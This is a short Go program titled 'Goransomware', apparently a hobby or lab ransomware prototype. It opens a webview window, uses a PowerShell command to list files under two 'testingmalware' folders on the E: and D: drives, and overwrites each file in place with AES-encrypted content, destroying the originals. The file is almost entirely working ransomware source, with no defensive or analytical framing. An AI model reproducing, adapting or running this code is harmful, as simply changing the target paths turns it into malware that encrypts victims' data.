package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"

	"github.com/Equanox/gotron"
)

func getFileDir(s string) []string {
	file := `Get-ChildItem -Path "` + s + `" -Recurse -File | Select-Object -First 10 -ExpandProperty FullName`
	cmd := exec.Command("powershell", file)
	output, err := cmd.Output()
	if err != nil {
		fmt.Println("Error:", err)
	}

	lsOutputArr := strings.Split(strings.TrimSpace(string(output)), "\r\n")
	return lsOutputArr
}
func main() {
	window, err := gotron.New("webview")
	if err != nil {
		panic(err)
	}

	window.WindowOptions.Width = 1200
	window.WindowOptions.Height = 980
	window.WindowOptions.Title = "Goransomware"

	done, err := window.Start()
	if err != nil {
		panic(err)
	}

	<-done
	var wg sync.WaitGroup
	wg.Add(2)

	go func() {
		lsOutputArr := getFileDir("E:/testingmalware")
		for i := 0; i < len(lsOutputArr); i++ {
			fi, err := os.Open(lsOutputArr[i])
			if err != nil {
				fmt.Println("Error opening file:", err)
				continue
			}
			content, err := io.ReadAll(fi)
			fi.Close()
			if err != nil {
				fmt.Println("Error reading file:", err)
				continue
			}
			enc, _ := GetAESEncrypted(string(content))
			os.WriteFile(lsOutputArr[i], []byte(enc), 0644)
		}

		wg.Done()
	}()
	go func() {
		lsOutputArr := getFileDir("D:/testingmalware")
		for i := 0; i < len(lsOutputArr); i++ {
			fi, err := os.Open(lsOutputArr[i])
			if err != nil {
				fmt.Println("Error opening file:", err)
				continue
			}
			content, err := io.ReadAll(fi)
			fi.Close()
			if err != nil {
				fmt.Println("Error reading file:", err)
				continue
			}
			enc, _ := GetAESEncrypted(string(content))
			os.WriteFile(lsOutputArr[i], []byte(enc), 0644)
		}

		wg.Done()
	}()

	wg.Wait()
	time.Sleep(5 * time.Second)

}
